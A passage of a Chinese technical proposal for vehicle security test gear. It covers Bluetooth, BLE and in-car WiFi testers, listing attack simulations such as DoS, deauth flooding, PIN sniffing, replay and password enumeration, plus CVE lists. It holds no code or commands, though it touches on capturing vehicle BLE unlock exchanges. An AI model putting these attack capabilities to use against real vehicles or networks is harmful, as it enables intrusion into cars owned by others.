title="硬件方案"></a>硬件方案</h5><p>外观：便携式设计，方便携带和使用。</p><p>网络接口：支持1路10M/100M/1000M自适应以太网口，用于与测试对象进行连接和通信。</p><h5 id="软件方案"><a href="#软件方案" class="headerlink" title="软件方案"></a>软件方案</h5><p>前端设计：</p><p>用户界面：设计直观、用户友好的界面，使用户能够方便地进行操作和管理。</p><p>功能模块：将各项功能划分为不同的模块，如蓝牙测试模块、任务管理模块、数据管理模块等。</p><p>数据展示：通过图表、表格等方式展示测试结果和相关数据，以便用户进行分析和评估。</p><p>后端设计：</p><p>服务器端：搭建服务器端，用于处理前端请求、执行相应的测试任务和数据处理。</p><p>数据库：设计数据库用于存储测试对象信息、测试任务信息、测试结果数据等。</p><p>任务管理：实现任务管理功能，包括新增、编辑、删除、搜索、配置用例、开始检测和查看结果等操作。</p><p>测试功能：实现各项测试功能，如蓝牙安全测试、数据加密测试、拒绝服务攻击测试、协议栈漏洞测试等。</p><p>数据和日志管理：记录和管理测试过程中产生的测试数据和操作日志，以便用户查看和导出。</p><p>安全通信：在安全通信方面，采用SSL的方式进行了加密通信，这是为了保障安全的进行数据传输。</p><p>数据导出和报告：</p><p>数据导出：支持将测试结果数据导出为常见格式，如CSV、Excel等，以便用户进行进一步的数据分析和处理。</p><p>报告生成：根据测试结果自动生成测试报告，包括测试概要、测试结果、修复建议等内容。</p><p>报告导出：支持将测试报告导出为PDF格式，以便用户进行存档、分享和提交给相关方。</p><p>用户权限和安全：</p><p>用户身份验证：实现用户身份验证机制，确保只有授权用户可以访问和使用工具。</p><p>用户权限管理：设置不同的用户权限，限制用户对工具的操作和访问范围。</p><p>安全性考虑：在开发过程中，注重安全性，防止潜在的安全漏洞和攻击。</p><p>扩展性和可维护性：</p><p>扩展性：设计具有良好扩展性的架构，以方便后续添加新的功能模块和测试功能。</p><p>可维护性：采用合适的编程规范和设计模式，使代码易于维护和修改。</p><h5 id="工具功能"><a href="#工具功能" class="headerlink" title="工具功能"></a>工具功能</h5><p>蓝牙测试：支持对经典蓝牙和低功耗蓝牙进行安全测试。</p><p>蓝牙信息显示：显示蓝牙地址、蓝牙名称和RSSI信号强度等相关信息。</p><p>经典蓝牙数据加密测试：测试经典蓝牙连接的数据加密性能。</p><p>经典蓝牙拒绝服务攻击测试：模拟经典蓝牙的拒绝服务攻击，评估系统的鲁棒性。</p><p>经典蓝牙连接占用测试：测试经典蓝牙连接的资源占用情况。</p><p>经典蓝牙协议栈漏洞测试：测试经典蓝牙协议栈中的漏洞，包括CVE-2017-1000250、CVE-2017-1000251、CVE-2020-12352、CVE-2020-12351等。</p><p>低功耗蓝牙数据加密测试：测试低功耗蓝牙连接的数据加密性能。</p><p>低功耗蓝牙BLE pin码嗅探测试：测试低功耗蓝牙BLE连接的PIN码嗅探能力。</p><p>低功耗蓝牙重放测试：测试低功耗蓝牙连接的重放攻击防护能力。</p><p>低功耗蓝牙从机连接占用测试：测试低功耗蓝牙从机连接的资源占用情况。</p><p>低功耗蓝牙拒绝服务攻击测试：模拟低功耗蓝牙的拒绝服务攻击，评估系统的鲁棒性。</p><p>低功耗蓝牙协议栈漏洞测试：测试低功耗蓝牙协议栈中的漏洞，包括CVE-2017-1000250、CVE-2017-1000251、CVE-2020-12352、CVE-2020-12351、CVE-2019-17519、CVE-2019-16336、CVE-2019-17517、CVE-2019-17518、CVE-2019-17520、CVE-2019-19195、CVE-2019-19196、CVE-2020-10061、CVE-2020-10069、CVE-2020-13594、CVE-2019-17061、CVE-2019-17060、CVE-2019-19192、CVE-2019-19193、CVE-2020-13595、CVE-2019-19194、CVE-2020-13593等。</p><p>高级功能支持：包括蓝牙（经典/低功耗）嗅探等高级功能。</p><p>测试对象管理：支持对测试对象进行新增、删除、修改和搜索等操作。</p><p>任务管理：在任务管理页面，用户可以新增、编辑、删除、搜索、配置用例、开始检测和查看结果等操作。</p><p>测试对象与任务关联：一个测试对象可以对应多个测试任务，方便管理和组织测试。</p><p>数据和日志管理：支持显示和导出测试过程中产生的测试数据和操作日志。</p><p>测试报告导出：支持将测试结果导出为PDF格式的测试报告，并对不通过的测试用例提出修复建议。</p><p>安全通信：工具采用B/S设计架构，通过SSL加密通信方式，用户可以通过浏览器远程方便地进行管理。</p><h3 id="蓝牙协议分析工具"><a href="#蓝牙协议分析工具" class="headerlink" title="蓝牙协议分析工具"></a>蓝牙协议分析工具</h3><h4 id="工具概述-1"><a href="#工具概述-1" class="headerlink" title="工具概述"></a>工具概述</h4><p>蓝牙协议分析工具可以支持蓝牙信令测试及所有odeRF指标测试，内置信号源和干扰源，进行更多标准测试。</p><h4 id="功能实施方案-46"><a href="#功能实施方案-46" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>产品信息如下：</p><p>品牌：国利</p><p>型号：GLBTxy226</p><p>数量：2套</p><p>指标参数信息如下：</p><ol><li>全面支持蓝牙BT5.0，可以提供更快的无线传输速度和更稳定的连接性能。蓝牙BT5.0相比于之前的版本，具有更高的传输速度、更低的功耗和更远的传输距离。同时，蓝牙BT5.0还支持更多的蓝牙设备连接，可以同时连接多个设备进行数据传输；</li><li>支持蓝牙所有RF指标测试，包括发射功率、接收灵敏度、频率偏移、频率稳定性、谐波、杂散等指标测试。这些测试可以帮助用户评估蓝牙设备的性能和稳定性，检测设备是否符合蓝牙标准要求。同时，这些测试还可以帮助用户诊断蓝牙设备的问题，提高设备的可靠性和稳定性；</li><li>设备内置信号源和干扰源，可以进行更多标准测试，包括发射功率、接收灵敏度、频率偏移、频率稳定性、谐波、杂散等指标测试。同时，内置信号源和干扰源还可以模拟不同的无线信号环境，进行干扰测试、抗干扰测试等，从而更加真实地模拟实际的无线环境，提高测试的准确性和可靠性；</li><li>全配置测试覆盖，可以覆盖蓝牙设备的所有测试需求，包括协议栈测试、RF测试、功耗测试、性能测试、兼容性测试等。全配置测试覆盖可以帮助用户全面评估蓝牙设备的性能和稳定性，检测设备是否符合蓝牙标准要求。同时，全配置测试覆盖还可以帮助用户诊断蓝牙设备的问题，提高设备的可靠性和稳定性；</li><li>支持蓝牙信令测试，可以对蓝牙设备的协议栈进行测试，包括连接管理、安全管理、数据传输等方面的测试。蓝牙信令测试可以帮助用户评估蓝牙设备的协议栈实现是否符合蓝牙标准要求，检测设备是否存在协议栈相关的问题；</li><li>软件操作界面直观简洁，用户可以通过界面进行设备的配置、测试和管理等操作。软件操作界面设计简洁明了，易于操作，用户可以快速上手，无需进行复杂的培训；</li><li>可以通过USB读取测试脚本，用户可以将测试脚本保存在USB存储设备中，然后通过设备提供的USB接口进行读取。这个功能可以帮助用户更加方便地管理测试脚本，提高测试效率和准确性。用户可以根据需要将测试脚本保存在USB存储设备中，然后将USB存储设备插入设备的USB接口，即可将测试脚本导入到设备中进行测试。</li></ol><h4 id="性能实施方案-1"><a href="#性能实施方案-1" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1)启动时间不超过2秒，可以快速启动并进入工作状态。快速启 动可以帮助用户更加方便地进行测试工作，提高测试效率。</p><h4 id="技术实现内容-39"><a href="#技术实现内容-39" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="硬件方案-1"><a href="#硬件方案-1" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>蓝牙版本支持：选择硬件模块和芯片，确保全面支持蓝牙BT5.0及以下版本。</p><p>RF指标测试支持：设计相应的电路和接口，以支持对蓝牙的所有RF指标进行测试。</p><p>内置信号源和干扰源：在硬件中集成信号源和干扰源，以进行更多标准测试，如功率测试、频谱分析等。</p><p>测试覆盖配置：提供全面的测试覆盖配置选项，使用户能够根据需要自定义测试参数。</p><h5 id="软件方案-1"><a href="#软件方案-1" class="headerlink" title="软件方案"></a>软件方案</h5><p>前端设计：</p><p>用户界面：设计简单直观的用户界面，使用户能够轻松进行操作和配置。</p><p>测试配置：提供配置选项，包括选择蓝牙版本、设置测试参数、选择测试覆盖范围等。</p><p>测试控制：实现启动测试、停止测试、暂停测试等控制功能。</p><p>测试结果展示：以图表、表格等形式展示测试结果，包括蓝牙信令分析、RF指标测试结果等。</p><p>后端设计：</p><p>数据处理：接收前端发送的测试配置和控制指令，处理数据并生成测试结果。</p><p>蓝牙信令解析：实现蓝牙信令的解析功能，将蓝牙设备之间的通信流量进行解析和分析。</p><p>RF指标测试：设计相应的算法和逻辑，对蓝牙的各项RF指标进行测试和评估。</p><p>数据存储：将测试结果和相关数据存储到数据库或文件中，以便后续查询和导出。</p><p>USB读取测试脚本：</p><p>设计USB接口的读取功能，以支持从外部设备读取测试脚本。</p><p>解析测试脚本：对读取的测试脚本进行解析，提取测试配置和参数。</p><p>自动化测试：根据测试脚本中的配置和参数，自动执行相应的测试流程。</p><p>用户权限和安全：</p><p>用户身份验证：实现用户身份验证机制，确保只有授权用户可以访问和使用工具。</p><p>用户权限管理：设置不同的用户权限，限制用户对工具的操作和访问范围。</p><p>安全性考虑：在开发过程中，注重安全性，防止潜在的安全漏洞和攻击。</p><p>扩展性和可维护性：</p><p>扩展性：设计具有良好扩展性的架构，以方便后续添加新的功能模块和测试功能。</p><p>可维护性：采用合适的编程规范和设计模式，使代码易于维护和修改。</p><h5 id="工具功能-1"><a href="#工具功能-1" class="headerlink" title="工具功能"></a>工具功能</h5><p>蓝牙信令测试：实现蓝牙信令的解析和分析功能，以捕获和分析蓝牙设备之间的通信流量。</p><p>操作界面设计：设计简单直观的软件操作界面，使用户能够轻松进行测试配置、启动测试和查看测试结果。</p><p>USB接口支持：提供USB接口，以便用户可以通过USB读取测试脚本，方便测试流程的自动化和批量测试。</p><p>内置信号源和干扰源，进行更多标准测试，支持蓝牙BT5.0及蓝牙所有RF指标测试。</p><h3 id="蓝牙BLE检测工具"><a href="#蓝牙BLE检测工具" class="headerlink" title="蓝牙BLE检测工具"></a>蓝牙BLE检测工具</h3><h4 id="工具概述-2"><a href="#工具概述-2" class="headerlink" title="工具概述"></a>工具概述</h4><p>蓝牙BLE属于近场通讯协议，是无线通信协议中的一种，它被广泛用于手机、便携式设备、物联网等领域，能够提供轻松、安全、迅速的通信，蓝牙BLE的配对机制也保证了一定的安全性。</p><h4 id="功能实施方案-47"><a href="#功能实施方案-47" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>支持高级蓝牙低能耗（BLE）技术，能够无线检测并接收BLE蓝牙设备发出的信号，实现有效的数据通讯和设备管理；</li><li>支持监控蓝牙数据包，可以方便地分析车辆BLE通信流程。设备可以捕获BLE蓝牙设备之间的通信数据包，并对数据包进行解码和分析，从而帮助用户了解BLE通信流程和数据传输过程；</li><li>支持通过RSSI过滤和排序，可以根据BLE蓝牙设备的信号强度进行过滤和排序。设备可以检测BLE蓝牙设备的信号强度，即RSSI值，并根据RSSI值对设备进行过滤和排序。用户可以根据需要选择RSSI值的范围，过滤出符合条件的设备，并按照RSSI值的大小进行排序，方便用户进行后续的测试和分析；</li><li>支持4G网络传输，可以通过4G网络进行数据传输和远程控制。同时，设备支持传输网络带宽&gt;=10M，可以保证数据传输的速度和稳定性；</li><li>可以扫描汽车蓝牙服务，扫描范围小于2米，并且可以在不到2分钟内采集到蓝牙数据。设备可以检测汽车蓝牙服务的广播信号，并对信号进行解码和分析，从而帮助用户了解汽车蓝牙服务的广播内容和数据传输过程；</li><li>主机端与手机之间的距离在实际情况下保持在不超过5米，但需要注意的是，这个距离会受到手机蓝牙信号强度的影响。随着距离的增加，信号强度会逐渐减弱，因此在考虑蓝牙通信时需要注意距离的限制和信号质量的变化；</li><li>通过远程端进行连接时，要保证距离的限制，一般可以在远程端距离车&lt;2米的范围内进行使用；</li><li>配置了标准的CSR芯片的蓝牙适配器，具有高性能、低功耗、稳定性强等特点，可以满足不同类型的蓝牙设备测试和开发需求；</li><li>树莓派4B处理器是一款高性能单板计算机，采用ARM Cortex-A72架构，拥有四个核心，该处理器的默认时钟频率为1.5GHz，每个核心在运行时的时钟速度为1.5GHz，可保证快速的计算能力和响应速度。通过使用ARM Cortex-A72架构，树莓派4B处理器能够提供出色的性能，适用于各种计算密集型任务和应用场景。四个核心的设计允许同时处理多个任务，提高了系统的并行处理能力。总体而言，树莓派4B处理器以其高性能和灵活性，成为许多嵌入式计算和物联网应用的理想选择；</li><li>该设备内置了两节18650可充电电池，用于日常供电。同时，它还配备了一个micro USB充电口，方便用户进行电池的充电操作。用户可以通过micro USB充电口连接充电器或电脑，对电池进行充电，以确保设备的持续供电和使用便利。这种设计使得电池的维护和充电变得简单方便，用户可以根据需要随时充电，确保设备的可靠运行。</li></ol><h4 id="技术实现内容-40"><a href="#技术实现内容-40" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="硬件方案-2"><a href="#硬件方案-2" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>BLE信号检测：采用高灵敏度的蓝牙芯片（如NRF52832）和天线设计，支持检测BLE蓝牙设备的无线信号。配置标准CSR芯片适配。</p><p>数据采集和存储：设计数据采集模块，能够随时监控和分析蓝牙数据包，并将数据存储在本地存储器或内置存储卡中。</p><p>通信接口支持：提供4G网络、Wi-Fi和以太网连接选项，以便传输数据到云端或其他设备。</p><p>数据上传方式：支持WebSocket、MQTT、HTTP三种数据上传方式，使用户可以根据需求选择合适的上传方式。</p><p>其他硬件：树莓派4b处理器，四个ARM Cortex-A72核心，默认时钟频率1.5Ghz。设计两节18650可充电电池供电，micro usb充电口。</p><h5 id="软件方案-2"><a href="#软件方案-2" class="headerlink" title="软件方案"></a>软件方案</h5><p>前端设计：</p><p>用户界面：设计直观易用的用户界面，包括设备列表、数据包监控窗口、配置选项等。</p><p>设备扫描：提供设备扫描功能，显示附近可用的BLE设备列表，并显示设备的基本信息。</p><p>数据包监控：实时显示捕获到的蓝牙数据包，包括广播数据、GATT服务等，并提供过滤和排序选项。</p><p>配置选项：允许用户配置扫描参数、过滤条件、数据上传方式等。</p><p>后端设计：</p><p>BLE设备管理：实现BLE设备的连接和断开功能，监测设备连接状态，并提供设备信息的获取和展示。</p><p>数据包分析：解析捕获到的蓝牙数据包，提取关键信息并以可读形式展示，方便用户分析数据交换流程。</p><p>BLE数据类型扫描：支持扫描多种BLE数据类型，如广播数据、GATT服务等，以提供更全面的监测和分析。</p><p>RSSI过滤：根据用户设定的RSSI阈值，过滤掉距离过远或过近的BLE设备，以便集中关注特定距离范围内的设备。</p><p>数据上传：支持MQTT、HTTP和WebSocket三种数据上传方式，将捕获到的数据传输到云端或其他设备。</p><p>数据存储和导出：</p><p>数据存储：将捕获到的蓝牙数据包和相关信息存储在本地数据库或文件中，以便后续查询和分析。</p><p>数据导出：提供数据导出功能，允许用户将数据以文件或其他格式导出，方便进一步处理和共享。</p><p>用户权限和安全：</p><p>用户身份验证：实现用户身份验证机制，确保只有授权用户可以访问和使用工具。</p><p>用户权限管理：设置不同的用户权限，限制用户对工具的操作和访问范围。</p><p>安全性考虑：在开发过程中，注重安全性，防止潜在的安全漏洞和攻击。</p><p>网络连接和通信：</p><p>支持4G网络、Wi-Fi和以太网连接选项，以便传输数据到云端或其他设备。</p><p>实现MQTT、HTTP和WebSocket等通信协议，以支持数据上传和远程控制。</p><h5 id="工具功能-2"><a href="#工具功能-2" class="headerlink" title="工具功能"></a>工具功能</h5><p>BLE设备监控管理：实现对蓝牙BLE设备的监控管理功能，包括设备扫描、连接状态监测、设备信息展示等。</p><p>数据包分析：实现对蓝牙数据包的监控和分析功能，方便分析车辆BLE通信流程和蓝牙解锁的详细数据交换流程。</p><p>BLE数据类型扫描：支持扫描多种BLE数据类型，如广播数据、GATT服务等。</p><p>RSSI过滤：支持通过RSSI（接收信号强度指示）进行过滤，以筛选特定距离范围内的BLE设备。</p><p>多设备广播信息读取：支持同时读取多个BLE设备的广播信息，以提供更全面的监测和分析。</p><p>数据上传：实现数据上传功能，支持通过MQTT、HTTP和WebSocket将数据传输到云端或其他设备。</p><p>数据采集距离和时间：确保在10米范围内进行数据采集，并保证采集时间不超过10分钟。</p><p>解锁信号发送距离：保证解锁信号的发送距离不超过50米。</p><p>蓝牙工作频率：支持2402-2480MHz的蓝牙工作频率范围，以及2.4GHz的Wi-Fi频段。</p><p>能效设计：优化硬件设计，确保低功耗和高效能运行。</p><p>供电方式：支持5V/2A的Micro USB供电或POE以太网供电方式。</p><p>天线设计：采用板载PCB天线设计，以提供稳定的Wi-Fi连接。</p><h3 id="WIFI安全测试工具"><a href="#WIFI安全测试工具" class="headerlink" title="WIFI安全测试工具"></a>WIFI安全测试工具</h3><h4 id="工具概述-3"><a href="#工具概述-3" class="headerlink" title="工具概述"></a>工具概述</h4><p>WIFI安全测试工具通过全面模拟WIFI应用的各种行为，自动抓取与被测WIFI设备的通信数据包，结合自身完善的检测能力和权威的漏洞库进行有效扫描，可识别出数据是否加密及数据加密算法等。</p><h4 id="功能实施方案-48"><a href="#功能实施方案-48" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>产品信息如下：</p><p>品牌：国利</p><p>型号：GLwifi4/5L</p><p>数量：2套</p><p>指标参数信息如下：</p><ol><li>设备采用了轻便、紧凑的便携式风格，使其易于携带和使用。其外观简约时尚，提供了更加舒适的使用体验；</li><li>支持1路以太网口，可自适应10M、100M和1000M三种速率，适用于不同的网络环境，提供更加灵活的连接方式；</li><li>设备具有2.4G和5G双频设计，2.4G频段的网络覆盖范围广，但传输速度较慢；5G频段的网络传输速度快，但覆盖范围较窄。通过双频设计，设备可以根据需要自动切换2.4G或5G频段的网络，以获得更好的网络连接质量和速度；设备支持802.11a/b/g/n/ac协议，可以兼容多种无线网络设备和协议。其中，802.11a/b/g/n协议是较为常见的无线网络协议，可以提供较为稳定和高速的无线网络连接；802.11ac协议是较新的无线网络协议，可以提供更高的传输速度和更大的网络容量。通过支持多种协议，设备可以满足不同的无线网络需求，提供更加灵活和高效的无线网络连接；</li><li>支持对车载WIFI设备的AP模式和STA模式进行安全测试。在AP模式下，该工具可以模拟攻击者对车载WIFI设备进行攻击，例如通过暴力破解密码、注入恶意数据包等方式进行攻击。在STA模式下，该工具可以模拟攻击者对车载WIFI设备连接的无线网络进行攻击，例如通过欺骗、中间人攻击等方式进行攻击。通过这些测试，可以发现车载WIFI设备的安全漏洞，并采取相应的措施加以修复，从而提高车载WIFI设备的安全性和可靠性；功能的界面截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8ee0e43898d913146157d3256c79c747.png"></p><ol><li>支持WIFI接入认证机制检测。在WIFI接入认证机制检测中，该工具可以模拟攻击者对车载WIFI设备的认证机制进行攻击，例如对WPA/WPA2-PSK认证机制进行暴力破解、对WEP认证机制进行注入攻击等；</li><li>支持对车载WIFI设备的端口进行扫描和检测，以确定哪些端口是开放的，哪些端口是关闭的。通过检测车载WIFI设备的端口开放情况，可以发现潜在的安全漏洞和风险，例如未经授权的端口开放、不安全的端口开放等；</li><li>支持对车载WIFI设备进行拒绝服务攻击检测，以发现车载WIFI设备是否存在拒绝服务漏洞。拒绝服务攻击是一种常见的网络攻击方式，攻击者通过向目标设备发送大量的无效数据包或者伪造的数据包，使得目标设备无法正常工作，从而导致服务不可用。在车载WIFI设备中，拒绝服务攻击可能会导致车载WIFI网络无法正常工作，从而影响车辆的正常使用；</li><li>支持WIFI密码枚举检测，以发现车载WIFI设备是否存在密码弱点。密码枚举是一种常见的网络攻击方式，攻击者通过尝试不同的密码组合，来猜测目标设备的密码，从而获取设备的访问权限。在车载WIFI设备中，密码弱点可能会导致车载WIFI网络被攻击者入侵，从而影响车辆的正常使用；</li><li>该测试工具支持WIFI DeAuth泛洪攻击检测，以发现车载WIFI设备是否存在DeAuth泛洪攻击漏洞。DeAuth泛洪攻击是一种常见的网络攻击方式，攻击者通过向目标设备发送大量的DeAuth数据包，使得目标设备无法正常工作，从而导致服务不可用。在车载WIFI设备中，DeAuth泛洪攻击可能会导致车载WIFI网络无法正常工作，从而影响车辆的正常使用。通过使用该测试工具，可以模拟DeAuth泛洪攻击，发现车载WIFI设备的漏洞，并采取相应的措施加以修复，提高车载WIFI设备的安全性和可靠性；</li><li>支持WIFI不安全认证类型检测，以发现车载WIFI设备是否存在不安全的认证类型。在车载WIFI设备中，不安全的认证类型可能会导致车载WIFI网络被攻击者入侵，从而影响车辆的正常使用。通过使用该测试工具，可以检测车载WIFI设备的认证类型，发现不安全的认证类型，并采取相应的措施加以修复，提高车载WIFI设备的安全性和可靠性；</li><li>支持WIFI钓鱼攻击检测，以发现车载WIFI设备是否存在钓鱼攻击漏洞。WIFI钓鱼攻击是一种常见的网络攻击方式，攻击者通过伪造无线网络的SSID和MAC地址，欺骗用户连接到恶意的无线网络，从而窃取用户的敏感信息。在车载WIFI设备中，钓鱼攻击可能会导致车载WIFI网络被攻击者入侵，从而影响车辆的正常使用；</li><li>支持WIFI明文传输检测，以发现车载WIFI设备是否存在明文传输协议漏洞。在车载WIFI设备中，明文传输协议可能会导致用户的敏感信息被攻击者窃取，从而造成严重的安全问题。通过使用该测试工具，可以检测车载WIFI设备的无线网络是否使用明文传输协议，并采取相应的措施加以修复，提高车载WIFI设备的安全性和可靠性；</li><li>支持WIFI漏洞检测，包括多个常见的漏洞，如CVE_2021_34173、CVE-2020-11914、CVE-2020-11908、CVE-2020-11913、CVE-2020-11912、CVE-2020-11898、CVE-2020-11902、CVE-2020-11911、CVE_2021_34174、CVE-2020-11910、CVE-2020-11909、CVE-2020-11907、CVE-2020-11906、CVE-2020-11905、CVE-2020-11903、CVE-2020-11899、CVE-2020-11904、CVE-2020-11900、CVE-2020-11901、CVE-2020-11897、CVE-2020-11896等。这些漏洞可能会导致车载WIFI设备的安全性和可靠性受到威胁，例如远程代码执行、拒绝服务攻击、信息泄露等；关于测试工具、被测对象、测试过程日志、测试结果等信息的截图如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8a87afd8a2b335a87d5aad2c2d555299.png"></p><p>WiFi安全测试工具</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ffd7ed9825e99d4226682460e669432d.png"></p><p>被测对象、测试过程日志、测试结果</p><ol><li>WIFI嗅探是一种常见的网络安全测试技术，通过WIFI嗅探，可以获取车载WIFI设备的无线网络流量数据包，进而分析数据包中的信息，例如源地址、目的地址、协议类型、数据内容等。开启WIFI热点则可以让车载WIFI设备作为一个热点，为其他设备提供无线网络连接；</li><li>支持测试对象进行新增、删除、修改或对已有测试对象的搜索，可以帮助用户更加方便地管理测试对象，提高测试效率和准确性。用户可以通过设备提供的界面进行测试对象的新增、删除和修改操作，也可以通过搜索功能快速查找已有的测试对象，从而更加方便地进行测试工作；</li><li>支持任务管理页面中可以对测试任务进行新增、编辑、删除、搜索、配置用例、开始检测、查看结果等操作。在任务管理页面中，用户可以创建新的测试任务，编辑已有的测试任务，删除不需要的测试任务，以及搜索和筛选测试任务。同时，用户还可以在任务管理页面中配置测试用例，包括选择测试用例、设置测试参数等。在测试任务开始后，用户可以在任务管理页面中查看测试进度和结果，测试用例的执行情况、检测结果等。通过任务管理页面，用户可以方便地管理和监控测试任务，提高测试效率和准确性；</li><li>支持测试对象与测试任务相关联，一个测试对象可以对应多个测试任务，可以帮助用户更加方便地管理测试对象和测试任务，提高测试效率和准确性。用户可以将测试对象与测试任务进行关联，从而更加方便地进行测试工作。一个测试对象可以对应多个测试任务，用户可以根据需要进行配置，从而更加灵活地进行测试工作；</li><li>支持对测试过程中产生的测试数据、操作日志的显示与导出，可以帮助用户更加方便地管理测试数据和操作记录，提高测试效率和准确性。用户可以通过设备提供的界面查看测试数据和操作日志，也可以将其导出到本地进行分析和处理；</li><li>支持测试报告的导出，导出格式为pdf，测试报告会对测试结果进行详细的分析和总结，包括测试用例的执行情况、测试数据的统计分析、测试结果的评估和建议等内容。对于不通过的测试用例，测试报告会提出修复建议，帮助用户更好地解决问题，提高设备的性能和稳定性。用户可以将测试报告导出到本地进行保存和分享；</li><li>工具采用B/S设计架构，并采用SSL加密通信方式，用户可以通过浏览器远程方便地进行管理。B/S设计架构可以帮助用户更加方便地进行设备管理，无需安装额外的客户端软件，只需要通过浏览器即可进行管理。同时，采用SSL加密通信方式可以保证用户的数据安全和隐私保护，防止数据被窃取或篡改；</li></ol><h4 id="性能实施方案-2"><a href="#性能实施方案-2" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>外置3根5db全向天线，可以提供更快的无线传输速度和更广的覆盖范围，可以同时支持多个设备进行无线传输，提高了网络的吞吐量和稳定性。外置3根5db全向天线可以提供更广的无线覆盖范围和更好的信号强度；</li><li>电源电压为100~240V AC，50/60Hz，采用内置通用电源设计，可以适应不同地区的电源标准，方便用户在全球范围内使用。</li></ol><h4 id="技术实现内容-41"><a href="#技术实现内容-41" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="硬件方案-3"><a href="#硬件方案-3" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>外观设计：工具采用便携式设计，轻巧的外壳，易于携带，耐用的材料制成，外形美观且符合人体工程学。</p><p>网络接口：设备配备1个RJ45网络接口，支持10M/100M/1000M自适应以太网，确保与外部网络的高速连接。</p><p>无线设计：采用2.4GHz和5GHz双频无线设计，支持802.11a/b/g/n/ac无线协议，确保与各种无线设备的兼容性。</p><p>电源设计：内置通用电源适配器，支持100~240V AC，50/60Hz，适应全球不同地区的电源标准。</p><h5 id="软件方案-3"><a href="#软件方案-3" class="headerlink" title="软件方案"></a>软件方案</h5><p>WiFi安全测试工具的软件核心采用模块化设计，每个模块负责不同的测试和分析任务。软件基于B/S架构开发，后端采用高性能的服务器端语言，如Go或Node.js，以处理并发请求和执行复杂的安全测试算法。前端使用现代的Web开发技术栈，如React或Vue.js，以提供动态和响应式的用户界面。</p><p>前端设计：</p><p>用户界面：采用现代化、直观的用户界面设计，使用户能够方便地进行操作和管理。</p><p>功能模块：将功能模块划分为不同的页面或组件，例如测试对象管理、测试任务管理、测试结果查看等。</p><p>用户权限和安全：实现用户认证和授权机制，根据用户角色分配不同的权限，确保系统安全性。</p><p>后端设计：</p><p>架构选择：采用B/S架构，使用流行的Web开发框架，如Django、Flask等，以实现后端逻辑和数据管理。</p><p>数据库设计：设计合适的数据库结构来存储测试对象、测试任务、测试数据和日志等信息。</p><p>API设计：定义合适的API接口，用于前端与后端之间的数据交互和通信。</p><p>业务逻辑：实现测试对象的新增、删除、修改和搜索功能，测试任务的新增、编辑、删除、搜索、配置用例、开始检测和查看结果功能等。</p><p>数据导出和报告：</p><p>测试数据导出：提供导出测试过程中产生的测试数据的功能，可以导出为常见的数据格式，如CSV、Excel等，以便后续分析和处理。</p><p>测试报告生成：根据测试结果自动生成测试报告，包括测试用例的执行情况、不通过的测试用例列表和修复建议等，导出格式为PDF，确保报告的可读性和易于分享。</p><p>用户权限和安全：</p><p>用户认证：实现用户注册、登录和注销功能，确保只有授权用户可以访问系统。</p><p>用户角色和权限管理：定义不同的用户角色，如管理员、普通用户等，根据角色分配不同的权限，以控制用户对系统的操作和访问范围。</p><p>数据安全：在安全通信方面，采用SSL的方式进行了加密通信，这是为了保障安全的进行数据传输</p><h5 id="工具功能-3"><a href="#工具功能-3" class="headerlink" title="工具功能"></a>工具功能</h5><p>车载WIFI测试：支持对车载WIFI设备的AP模式和STA模式进行安全测试，包括界面截图展示。</p><p>认证机制检测：检测WIFI接入认证机制的安全性，包括密码强度和认证协议。</p><p>端口开放检测：检测WIFI接入设备的端口开放情况，识别潜在的安全风险。</p><p>拒绝服务攻击检测：模拟DoS攻击，评估WIFI设备的抵抗能力。</p><p>密码枚举检测：检测WIFI网络对密码枚举攻击的抵抗能力。</p><p>DeAuth泛洪攻击检测：检测WIFI网络对DeAuth泛洪攻击的敏感性。</p><p>认证类型检测：检测WIFI网络中使用的不安全认证类型。</p><p>钓鱼攻击检测：模拟钓鱼攻击，检测WIFI网络的安全性。</p><p>明文传输检测：检测WIFI网络中的明文传输问题。</p><p>WIFI漏洞检测：针对列出的CVE漏洞进行检测。</p><p>高阶功能：包括WIFI嗅探、开启WIFI热点等功能。</p><p>测试对象管理：支持对测试对象进行新增、删除、修改或搜索。</p><p>任务管理：在任务管理页面中对测试任务进行管理，包括用例配置、检测启动和结果查看。</p><p>测试数据导出：支持测试过程中产生的测试数据和操作日志的显示与导出。</p><p>测试报告：生成详细的PDF格式测试报告，并对不通过的测试用例提出修复建议。</p><p>用户界面和远程管理</p><p>B/S架构：用户通过浏览器访问工具管理界面，无需安装额外软件。</p><p>SSL加密：在安全通信方面，采用SSL的方式进行了加密通信，这是为了保障安全的进行数据传输。</p><h3 id="射频钥匙安全测试工具"><a href="#射频钥匙安全测试工具" class="headerlink" title="射频钥匙安全测试工具"></a>射频钥匙安全测试工具</h3><h4 id="工具概述-4"><a href="#工具概述-4" class="headerlink" title="工具概述"></a>工具概述</h4><p>射频钥匙安全测试工具是对射频钥匙信息安全进行测试的专项工具，帮助渗透测试人员与汽车射频钥匙测试人员快速对车端的射频钥匙安全通信安全进行测试，生成测试报告，并给相对应的修复建议。</p><h4 id="功能实施方案-49"><a href="#功能实施方案-49" class="headerlink" 